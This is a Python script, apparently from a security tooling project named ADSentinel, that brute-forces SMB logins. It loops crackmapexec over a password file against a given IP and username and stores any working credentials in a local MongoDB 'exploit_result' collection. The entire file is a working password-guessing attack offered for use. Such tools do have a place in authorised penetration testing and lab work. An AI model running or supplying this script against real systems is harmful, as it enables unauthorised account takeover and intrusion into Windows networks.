import subprocess
import sys
from pymongo import MongoClient
from datetime import datetime

def bruteforce_attack(target_ip, username, password_file="/home/hongdan/project/ADSentinel/hd/script/sqlmap.txt"):
    try:
        print("Connecting to MongoDB...")
        # MongoDB 연결 설정
        client = MongoClient("mongodb://127.0.0.1:27017/")
        db = client["adsentinel_db"]
        exploit_result_collection = db["exploit_result"]
        print("Connected to MongoDB.")

        print(f"Loading passwords from {password_file}...")
        with open(password_file, 'r') as pf:
            passwords = [line.strip() for line in pf]
        print(f"Loaded {len(passwords)} passwords.")

        for password in passwords:
            print(f"Attempting {username}:{password} on {target_ip}...")
            result = subprocess.run(
                ["crackmapexec", "smb", target_ip, "-u", username, "-p", password],
                capture_output=True,
                text=True
            )

            if "[+]" in result.stdout:
                success_message = f"Success: {username}:{password}"
                print(success_message)
                # 공격 결과를 MongoDB에 저장
                exploit_result_collection.insert_one({
                    "target_ip": target_ip,
                    "username": username,
                    "password": password,
                    "result": "Success",
                    "output": result.stdout,
                    "timestamp": datetime.utcnow()
                })
                print("Result saved to MongoDB.")
                return success_message
            else:
                print(f"Failed: {username}:{password}")

        # 전체 시도가 완료되었으나 성공하지 못한 경우
        print("Bruteforce attack completed. No valid credentials found.")
        exploit_result_collection.insert_one({
            "target_ip": target_ip,
            "username": username,
            "result": "Failure",
            "output": "No valid credentials found.",
            "timestamp": datetime.utcnow()
        })
        print("Failure result saved to MongoDB.")
        return "Bruteforce attack completed. No valid credentials found."

    except Exception as e:
        error_message = f"Error occurred: {e}"
        print(error_message)
        # 오류도 MongoDB에 저장
        exploit_result_collection.insert_one({
            "target_ip": target_ip,
            "username": username,
            "result": "Error",
            "output": error_message,
            "timestamp": datetime.utcnow()
        })
        print("Error saved to MongoDB.")
        return error_message

# CLI 인자로 target_ip와 username을 받음
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python bruteforce.py <target_ip> <username>")
        sys.exit(1)

    target_ip = sys.argv[1]
    username = sys.argv[2]

    print(f"Starting bruteforce attack on {target_ip} with username {username}...")
    # Bruteforce 공격 실행
    result = bruteforce_attack(target_ip, username)
    print("Attack completed.")
    print("Final result:", result)

